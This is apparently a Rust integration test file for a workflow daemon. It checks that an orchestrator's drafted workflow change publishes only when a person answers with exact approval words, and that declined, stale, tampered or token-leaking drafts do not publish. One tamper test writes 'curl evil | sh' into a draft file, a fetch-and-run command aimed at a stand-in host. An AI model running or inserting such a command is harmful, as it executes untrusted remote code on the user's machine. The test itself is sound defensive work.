//! ov-971: the orchestrator drafts a workflow change and a person approves it. Real authenticated local sessions
//! against the ordinary service owner. Nothing is published until a person answers Approve on the draft's card;
//! the manager's answer, a decline and a draft the workflow has since moved past all publish nothing.
use std::{path::Path, sync::Arc};
use farcooler_daemon::landing_templates::{self as lt, Options};
use farcooler_daemon::{rpc::RpcFactory, service::Service, watch::Watcher,
    workflow_runtime::{CodingCi, CodingLanding, CodingCommand, CodingConfig, CodingHarness}};
use farcooler_protocol::{v1::{self as pb, request, result}, workflow_commands::{Action, Mutation}};
use farcooler_store::models::{NoteKind, TaskStatus};
use farcooler_transport::{Client, HandshakeConfig, UnixListenerServer};
mod common;
use uuid::Uuid;

type Link = Client<tokio::net::unix::OwnedReadHalf, tokio::net::unix::OwnedWriteHalf>;

async fn git(repo: &Path, args: &[&str]) -> String {
    let out = tokio::process::Command::new("/usr/bin/git").current_dir(repo).args(["-c", "core.hooksPath=/dev/null"]).args(args).output().await.unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8(out.stdout).unwrap().trim().into()
}
async fn configured() -> (tempfile::TempDir, CodingConfig) {
    let dir = tempfile::Builder::new().prefix("ov971").tempdir_in("/tmp").unwrap();
    let repo = dir.path().join("selected");
    std::fs::create_dir(&repo).unwrap();
    git(&repo, &["init", "--quiet"]).await;
    git(&repo, &["-c", "user.name=Test", "-c", "user.email=test@localhost", "-c", "commit.gpgsign=false", "commit", "--allow-empty", "-m", "base"]).await;
    let base = git(&repo, &["rev-parse", "HEAD"]).await;
    git(&repo, &["update-ref", "refs/heads/workflow-target", &base]).await;
    // The landing target is a private bare repository; nothing here ever pushes to it.
    let bare = dir.path().join("private-remote.git");
    std::fs::create_dir(&bare).unwrap();
    git(&bare, &["init", "--bare", "--quiet"]).await;
    git(&repo, &["push", bare.to_str().unwrap(), "HEAD:refs/heads/main"]).await;
    let landing = CodingLanding { job: "landing-971".into(), repository: bare.canonicalize().unwrap(), target: "refs/heads/main".into(),
        config_digest: farcooler_workflow::digest(&std::fs::read(bare.join("config")).unwrap()) };
    let command = || CodingCommand { argv: vec!["/usr/bin/true".into()], environment: [("PATH".to_string(), "/usr/bin:/bin".to_string())].into(), timeout_ms: 5000 };
    let config = CodingConfig { repository: repo.canonicalize().unwrap(), base, landing_ref: "refs/heads/workflow-target".into(), landing: Some(landing), pull_request: None,
        harness: CodingHarness::Command(command()), checks: vec![], reviewer: None,
        ci: CodingCi { repository: "offline/repository".into(), workflow: "ci".into(), event: "push".into(), command: command() } };
    (dir, config)
}

struct Host { service: Arc<Service>, workspace: Uuid, socket: std::path::PathBuf, stop: Arc<tokio::sync::Notify>, server: tokio::task::JoinHandle<()> }
impl Host {
    async fn open(root: &Path) -> Self {
        let service = Arc::new(Service::open_in(root.join("state")).await.unwrap());
        let git_dir = root.join("selected/.git").canonicalize().unwrap().to_string_lossy().into_owned();
        let repo_root = service.store.create_repository_root(service.host_id, "/isolated", 0).unwrap();
        let repo = service.store.create_repository(service.host_id, repo_root.id, "isolated", &git_dir, "").unwrap();
        let workspace = service.store.ensure_main_workspace(repo.id).unwrap().id;
        service.start_workflows().unwrap();
        let watcher = Watcher::new(service.clone());
        let socket = root.join("d.sock");
        let listener = UnixListenerServer::bind(&socket).unwrap();
        let stop = Arc::new(tokio::sync::Notify::new());
        let (svc, end, rpc_stop) = (service.clone(), stop.clone(), stop.clone());
        let server = tokio::spawn(async move {
            tokio::select! {
                result = listener.serve_with_pid(move |preamble, pid| Some((HandshakeConfig { daemon_version: "ov971".into() },
                    RpcFactory::new(svc.clone(), watcher.clone(), rpc_stop.clone(), farcooler_daemon::sessions::peer_from_preamble(preamble.as_ref())?).with_socket_caller(pid)))) => result.unwrap(),
                _ = end.notified() => (),
            }
        });
        Self { service, workspace, socket, stop, server }
    }
    async fn connect(&self) -> Link { Client::connect(&self.socket, "ov971", "1").await.unwrap() }
    async fn close(self) {
        self.stop.notify_one();
        self.server.await.unwrap();
        tokio::time::timeout(std::time::Duration::from_secs(15), self.service.stop_workflows()).await.unwrap().unwrap();
    }
}
async fn call(link: &mut Link, workspace: Uuid, action: Action) -> serde_json::Value {
    let mut req = farcooler_transport::request(action.method());
    req.target_resource_id = Some(bytes::Bytes::copy_from_slice(workspace.as_bytes()));
    req.payload = Some(request::Payload::WorkflowCommand(pb::WorkflowCommand { schema: 1, json: serde_json::to_string(&action).unwrap() }));
    let result::Value::WorkflowReply(reply) = link.call(req).await.unwrap().value.unwrap() else { panic!("wrong result") };
    serde_json::from_str(&reply.json).unwrap()
}
/// A note on the card, as `actor` says it.
async fn say(link: &mut Link, card: Uuid, kind: pb::TaskNoteKind, actor: &str, body: &str) {
    assert!(note(link, card, kind, actor, body, None).await, "the note was refused");
}
/// Whether the runner took the note.
async fn note(link: &mut Link, card: Uuid, kind: pb::TaskNoteKind, actor: &str, body: &str, supersedes: Option<Uuid>) -> bool {
    let mut req = farcooler_transport::request("task.note");
    req.payload = Some(request::Payload::TaskNoteAppend(pb::TaskNoteAppend { task_id: bytes::Bytes::copy_from_slice(card.as_bytes()), kind: kind as i32,
        body: body.into(), extra_json: String::new(), supersedes: supersedes.map(|s| bytes::Bytes::copy_from_slice(s.as_bytes())), actor: actor.into() }));
    matches!(link.call(req).await, Ok(r) if r.value.is_some())
}
/// The card's latest question, and the words at its end that approve it.
fn asked(host: &Host, card: Uuid) -> (farcooler_store::models::TaskNote, String) {
    let q = host.service.store.notes_for(card, Some(NoteKind::Question)).unwrap().pop().expect("a question");
    let at = q.body.rfind("answer `approve ").expect("the approving words") + "answer `".len();
    let words = q.body[at..].split('`').next().unwrap().to_string();
    (q, words)
}
fn bundle(config: &CodingConfig, template: &str, gate: &str) -> lt::Bundle {
    lt::template(template, config, &[gate.to_string()], &[], &Options::default()).unwrap()
}
async fn propose(link: &mut Link, workspace: Uuid, b: lt::Bundle, reason: &str) -> serde_json::Value {
    call(link, workspace, Action::Propose { reason: reason.into(), definition: b.definition, adapter: Box::new(b.adapter) }).await
}
fn card_of(reply: &serde_json::Value) -> Uuid { reply["draft"]["card"].as_str().unwrap().parse().unwrap() }
fn pin(host: &Host) -> Option<String> { host.service.store.workflow_configuration(&host.workspace.to_string()).unwrap().map(|c| c.pin) }

async fn as_a_person(name: &str) -> bool {
    common::as_a_person("ov971-person", name, std::time::Duration::from_secs(120)).await
}
async fn settles(host: &Host, card: Uuid, to: TaskStatus) {
    for _ in 0..200 {
        if host.service.store.get_task(card).unwrap().status == to { return; }
        tokio::time::sleep(std::time::Duration::from_millis(25)).await;
    }
    let said: Vec<_> = host.service.store.notes_for(card, Some(NoteKind::Finding)).unwrap().into_iter().map(|n| n.body).collect();
    panic!("the card never reached {to:?}; it is {:?}: {said:?}", host.service.store.get_task(card).unwrap().status);
}

#[tokio::test]
async fn a_draft_publishes_only_when_a_person_answers_approve() {
    if as_a_person("a_draft_publishes_only_when_a_person_answers_approve").await { return; }
    let (dir, config) = configured().await;
    let host = Host::open(dir.path()).await;
    let (ws, mut link) = (host.workspace, host.connect().await);
    let reply = propose(&mut link, ws, bundle(&config, "ticket-push", "make check"), "Gate every push on make check.").await;
    let card = card_of(&reply);
    assert_eq!(reply["draft"]["state"], "pending");
    assert!(reply["draft"]["summary"].as_str().unwrap().contains("`make check`"), "{reply}");
    assert_eq!(pin(&host), None, "a proposal publishes nothing");

    // The card is a decision in Needs Decision whose question is the whole change. It has no quick-answer
    // options, so no Needs You row or notification carries an Approve button: the words that approve it come
    // after the whole change.
    let task = host.service.store.get_task(card).unwrap();
    assert_eq!(task.status, TaskStatus::NeedsDecision);
    let (ask, words) = asked(&host, card);
    assert!(ask.extra.get("options").is_none(), "{:?}", ask.extra);
    assert!(ask.body.contains("What runs as you:") && ask.body.contains("In full, exactly as it runs:"), "{}", ask.body);
    assert!(ask.body.rfind(&words).unwrap() > ask.body.find("In full").unwrap(), "the approving words follow the change");
    assert!(!ask.body.lines().take(3).any(|l| l.contains(&words)), "a two- or three-line row never shows them");

    // Nobody but the daemon asks on the card or rewords it, so the question a person reads is the draft's.
    assert!(!note(&mut link, card, pb::TaskNoteKind::Question, "manager", "Approve this docs-only tidy-up?", None).await, "a manager's question is refused");
    assert!(!note(&mut link, card, pb::TaskNoteKind::Comment, "manager", "Docs only.", Some(ask.id)).await, "replacing the daemon's question is refused");
    assert!(!note(&mut link, card, pb::TaskNoteKind::Decision, "manager", "Approved.", None).await);
    assert_eq!(asked(&host, card).0.id, ask.id);

    // The orchestrator answering for itself, or saying the words in a comment, publishes nothing.
    say(&mut link, card, pb::TaskNoteKind::Answer, "manager", &words).await;
    say(&mut link, card, pb::TaskNoteKind::Comment, "user", &words).await;
    assert_eq!(pin(&host), None, "only the person's answer approves");
    let shown = call(&mut link, ws, Action::Drafts { draft: Some(reply["draft"]["id"].as_str().unwrap().into()) }).await;
    assert_eq!(shown["draft"]["state"], "pending");

    // A bare Approve, as from a row that shows only the headline, publishes nothing and asks again.
    say(&mut link, card, pb::TaskNoteKind::Answer, "user", "Approve").await;
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;
    assert_eq!(pin(&host), None, "approving takes the words only the whole change shows");
    let (again, same) = asked(&host, card);
    assert_ne!(again.id, ask.id, "asked again, so the card is back in Needs You");
    assert_eq!(same, words);
    assert_eq!(host.service.store.get_task(card).unwrap().status, TaskStatus::NeedsDecision);

    // The person answers with the words at the end of the change: it publishes, and the card closes.
    say(&mut link, card, pb::TaskNoteKind::Answer, "user", &format!("  {} ", words.to_uppercase())).await;
    settles(&host, card, TaskStatus::Done).await;
    let published = host.service.store.workflow_configuration(&ws.to_string()).unwrap().expect("published");
    assert_eq!(published.definition.source, "landing/ticket-push");
    let listed = call(&mut link, ws, Action::Drafts { draft: None }).await;
    assert_eq!(listed["drafts"][0]["state"], "approved");
    assert!(listed["drafts"][0]["answer"].is_string(), "the answer that approved it is recorded: {listed}");
    drop(link);
    host.close().await;
}

#[tokio::test]
async fn a_declined_draft_and_one_the_workflow_has_moved_past_publish_nothing() {
    if as_a_person("a_declined_draft_and_one_the_workflow_has_moved_past_publish_nothing").await { return; }
    let (dir, config) = configured().await;
    let host = Host::open(dir.path()).await;
    let (ws, mut link) = (host.workspace, host.connect().await);

    let first = propose(&mut link, ws, bundle(&config, "ticket-push", "make check"), "One ticket at a time.").await;
    say(&mut link, card_of(&first), pb::TaskNoteKind::Answer, "user", "Decline").await;
    settles(&host, card_of(&first), TaskStatus::Cancelled).await;
    assert_eq!(pin(&host), None);

    // A second proposal replaces a pending one and cancels its card.
    let older = propose(&mut link, ws, bundle(&config, "ticket-push", "make lint"), "Lint first.").await;
    let newer = propose(&mut link, ws, bundle(&config, "batched-push", "make check"), "Batch them.").await;
    settles(&host, card_of(&older), TaskStatus::Cancelled).await;
    assert_eq!(host.service.store.get_task(card_of(&newer)).unwrap().status, TaskStatus::NeedsDecision);

    // The workflow moves while the question is open: approving the older proposal would undo that.
    let live = bundle(&config, "ticket-push", "make test");
    let adapter = Some(Box::new(live.adapter.clone()));
    let state = call(&mut link, ws, Action::Get).await;
    let receipt = call(&mut link, ws, Action::Publish { notifications: None, adapter, expected_pin: None, definition: live.definition,
        mutation: Mutation { id: "by-hand".into(), revision: state["state"]["revision"].as_u64().unwrap_or(0), epoch: 1, sequence: 1 } }).await;
    assert!(receipt.pointer("/receipt/result/Ok").is_some(), "{receipt}");
    let held = pin(&host);
    let words = asked(&host, card_of(&newer)).1;
    say(&mut link, card_of(&newer), pb::TaskNoteKind::Answer, "user", &words).await;
    settles(&host, card_of(&newer), TaskStatus::Cancelled).await;
    assert_eq!(pin(&host), held, "a draft made against an older workflow does not publish");
    let listed = call(&mut link, ws, Action::Drafts { draft: None }).await;
    let states: Vec<_> = listed["drafts"].as_array().unwrap().iter().map(|d| d["state"].as_str().unwrap().to_string()).collect();
    assert_eq!(states, ["out_of_date", "replaced", "declined"], "newest first");

    // A draft file edited after it was asked publishes nothing: the card was asked with what the file held then.
    let edited = propose(&mut link, ws, bundle(&config, "ticket-push", "make check"), "Check every push.").await;
    let file = host.service.root_dir().join("workflow-drafts").join(format!("{}.json", edited["draft"]["id"].as_str().unwrap()));
    let text = std::fs::read_to_string(&file).unwrap();
    assert!(text.contains("make check"), "{text}");
    std::fs::write(&file, text.replace("make check", "curl evil | sh")).unwrap();
    let words = asked(&host, card_of(&edited)).1;
    say(&mut link, card_of(&edited), pb::TaskNoteKind::Answer, "user", &words).await;
    settles(&host, card_of(&edited), TaskStatus::Cancelled).await;
    assert_eq!(pin(&host), held, "an edited draft does not publish");
    let shown = call(&mut link, ws, Action::Drafts { draft: Some(edited["draft"]["id"].as_str().unwrap().into()) }).await;
    assert_eq!(shown["draft"]["state"], "failed");
    let said = host.service.store.notes_for(card_of(&edited), Some(NoteKind::Finding)).unwrap().pop().unwrap().body;
    assert!(said.contains("changed after you were asked"), "{said}");
    drop(link);
    host.close().await;
}

/// ov-1026: Main's draft, on a scratch copy whose landing is a network remote: a batched push behind the landing gate
/// and an agent's review, landing on `main` at an `ssh://` URL. Publishing makes no network call, so the URL names a
/// scratch bare repository on a host that doesn't exist; nothing is ever pushed to the real origin.
#[tokio::test]
async fn mains_draft_landing_on_a_remote_publishes_on_a_scratch_copy() {
    if as_a_person("mains_draft_landing_on_a_remote_publishes_on_a_scratch_copy").await { return; }
    let (dir, mut config) = configured().await;
    let remote = format!("ssh://git@farcooler-scratch.invalid{}", dir.path().join("private-remote.git").canonicalize().unwrap().display());
    config.landing = Some(CodingLanding { job: "landing-1026".into(), repository: remote.clone().into(), target: "refs/heads/main".into(), config_digest: String::new() });
    config.reviewer = Some(farcooler_daemon::workflow_runtime::CodingReviewer { identity: "agent-review".into(),
        command: CodingCommand { argv: vec!["/usr/bin/true".into()], environment: Default::default(), timeout_ms: 5000 } });
    let host = Host::open(dir.path()).await;
    let (ws, mut link) = (host.workspace, host.connect().await);
    let draft = lt::template("batched-push", &config, &["scripts/landing-gate".to_string()], &[lt::Extra::Agent], &Options { batch: Some(4), ..Options::default() }).unwrap();
    let reply = propose(&mut link, ws, draft, "Land Main's tickets on GitHub's main behind the landing gate and an agent's review.").await;
    let summary = reply["draft"]["summary"].as_str().unwrap();
    assert!(summary.contains(&format!("Code lands on `refs/heads/main` at `{remote}`")) && summary.contains("signs in with your own git and ssh settings"), "{summary}");
    let words = asked(&host, card_of(&reply)).1;
    say(&mut link, card_of(&reply), pb::TaskNoteKind::Answer, "user", &words).await;
    settles(&host, card_of(&reply), TaskStatus::Done).await;
    let published = host.service.store.workflow_configuration(&ws.to_string()).unwrap().expect("published");
    assert_eq!(published.definition.source, "landing/batched-push");
    let adapter = published.adapter.expect("an adapter");
    let farcooler_protocol::workflow_config::AdapterConfiguration::Coding(held) = adapter;
    assert_eq!(held.landing.unwrap().repository.to_string_lossy(), remote);

    // A URL that carries a token is refused: it would be written into receipts and process listings.
    let mut leaky = config.clone();
    leaky.landing.as_mut().unwrap().repository = "https://x-access-token:secret@github.com/o/r.git".into();
    let bad = lt::template("ticket-push", &leaky, &["scripts/landing-gate".to_string()], &[], &Options::default()).unwrap();
    let state = call(&mut link, ws, Action::Get).await;
    let action = Action::Publish { notifications: None, adapter: Some(Box::new(bad.adapter)), expected_pin: None, definition: bad.definition,
        mutation: Mutation { id: "leaky".into(), revision: state["state"]["revision"].as_u64().unwrap_or(0), epoch: 1, sequence: 9 } };
    let mut req = farcooler_transport::request(action.method());
    req.target_resource_id = Some(bytes::Bytes::copy_from_slice(ws.as_bytes()));
    req.payload = Some(request::Payload::WorkflowCommand(pb::WorkflowCommand { schema: 1, json: serde_json::to_string(&action).unwrap() }));
    let refused = link.call(req).await;
    assert!(refused.is_err() || !format!("{:?}", refused).contains("\"Ok\""), "{refused:?}");
    assert_eq!(pin(&host).as_deref(), Some(published.pin.as_str()), "the leaky URL published nothing");
    drop(link);
    host.close().await;
}

/// ov-1010: a workspace that has never published a workflow drafts its first one on settings the runner works out,
/// and the owner's approval publishes them. On GitHub there is no landing transport yet (ov-1026), so `get` refuses to
/// suggest and says why; the settings themselves, given the transport ov-1026 adds, draft and publish.
#[tokio::test]
async fn a_workspace_with_no_workflow_drafts_its_first_on_the_runners_suggestion() {
    if as_a_person("a_workspace_with_no_workflow_drafts_its_first_on_the_runners_suggestion").await { return; }
    if farcooler_core::programs::find("gh").is_none() { eprintln!("skipped: this host has no gh, which the suggested CI step needs"); return; }
    let (dir, configured) = configured().await;
    let repo = dir.path().join("selected");
    git(&repo, &["update-ref", "refs/heads/main", "HEAD"]).await;
    let host = Host::open(dir.path()).await;
    let (ws, mut link) = (host.workspace, host.connect().await);

    // With no GitHub origin there's no CI to wait on, and the runner says so instead of guessing.
    let got = call(&mut link, ws, Action::Get).await;
    assert!(got["configuration"].is_null() && got.get("suggested_adapter").is_none(), "{got}");
    assert!(got["suggested_adapter_refused"].as_str().unwrap().contains("origin isn’t on GitHub"), "{got}");

    // On GitHub there is CI, but nothing to land through yet: it refuses rather than suggest what can't publish.
    git(&repo, &["remote", "add", "origin", "git@github.com:example/first-workflow.git"]).await;
    let got = call(&mut link, ws, Action::Get).await;
    assert!(got.get("suggested_adapter").is_none(), "{got}");
    assert!(got["suggested_adapter_refused"].as_str().unwrap().contains("can’t land on yet"), "{got}");

    let mut suggested = farcooler_daemon::workflow_starter::settings(&host.service, ws).await.unwrap();
    assert_eq!(suggested.repository, repo.canonicalize().unwrap());
    assert_eq!((suggested.landing_ref.as_str(), suggested.base.clone()), ("refs/heads/main", git(&repo, &["rev-parse", "HEAD"]).await));
    assert_eq!((suggested.ci.repository.as_str(), suggested.ci.workflow.as_str()), ("example/first-workflow", "CI"));
    assert!(matches!(&suggested.harness, CodingHarness::Native { preset, settings: Some(_), .. } if preset == "claude"), "{:?}", suggested.harness);
    // Without a transport no template is sound, which is why the suggestion refuses.
    let none = lt::template("batched-push", &suggested, &["make check".into()], &[lt::Extra::Agent], &Options { batch: Some(4), ..Default::default() }).unwrap();
    let farcooler_protocol::workflow_config::AdapterConfiguration::Coding(pinned) = &none.adapter;
    assert!(farcooler_daemon::workflow_runtime::CodingConfigExt::validate_definition(pinned, &none.definition).is_err());

    // Given the transport, the settings draft, the owner approves, and they publish with each step's models.
    suggested.landing = configured.landing.clone();
    git(&repo, &["update-ref", "refs/heads/main", &suggested.base]).await;
    let b = lt::template("batched-push", &suggested, &["make check".into()], &[lt::Extra::Agent], &Options { batch: Some(4), ..Default::default() }).unwrap();
    let farcooler_protocol::workflow_config::AdapterConfiguration::Coding(pinned) = &b.adapter;
    farcooler_daemon::workflow_runtime::CodingConfigExt::validate_definition(pinned, &b.definition).expect("the settings and their draft are sound");
    let reply = propose(&mut link, ws, b, "Run Main through the engine.").await;
    let card = card_of(&reply);
    assert_eq!(reply["draft"]["state"], "pending", "{reply}");
    assert!(reply["draft"]["drafted_against"].is_null());
    let (ask, words) = asked(&host, card);
    assert!(ask.body.contains("claude:sonnet") && ask.body.contains("claude:opus"), "the card names the models: {}", ask.body);
    assert_eq!(pin(&host), None, "a proposal publishes nothing");

    say(&mut link, card, pb::TaskNoteKind::Answer, "user", &words).await;
    settles(&host, card, TaskStatus::Done).await;
    let published = host.service.store.workflow_configuration(&ws.to_string()).unwrap().expect("published");
    assert_eq!(published.definition.source, "landing/batched-push");
    assert_eq!(published.definition.models.get("build").map(|m| m[0].as_str()), Some("claude:sonnet"));
    let got = call(&mut link, ws, Action::Get).await;
    assert!(got["configuration"].is_object() && got.get("suggested_adapter").is_none() && got.get("suggested_adapter_refused").is_none(), "{got}");
    drop(link);
    host.close().await;
}
